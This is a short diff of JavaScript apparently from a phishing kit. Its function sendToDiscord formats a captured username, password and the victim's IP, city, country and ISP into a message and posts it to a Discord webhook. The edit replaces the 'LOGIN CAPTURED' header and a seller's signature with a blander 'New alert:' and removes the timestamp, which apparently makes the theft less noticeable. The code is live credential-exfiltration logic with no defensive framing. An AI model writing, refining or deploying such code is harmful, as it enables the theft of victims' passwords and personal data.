@@ -114,9 +114,8 @@
     async function sendToDiscord(username, password, geoData, attemptNum) {
       const { ip, city, region, country, country_code, isp } = geoData;
 
-      const message = `**LOGIN CAPTURED 🤖**
-
-**APP:** [YOUR APP NAME]
+      const message = `
+      New alert:
 **USERNAME:** ${username}
 **PASSWORD:** ${password}
 
@@ -126,10 +125,8 @@
 **COUNTRY:** ${country} (${country_code})
 **ISP:** ${isp}
 
-**ATTEMPT:** ${attemptNum} ⏱️
-**TIME:** ${new Date().toLocaleString()}
+**Attempt:** ${attemptNum} ⏱️
 
-🔐 2025 @FTECHSERVICES`;
 
       try {
         await fetch(DISCORD_WEBHOOK_URL, {
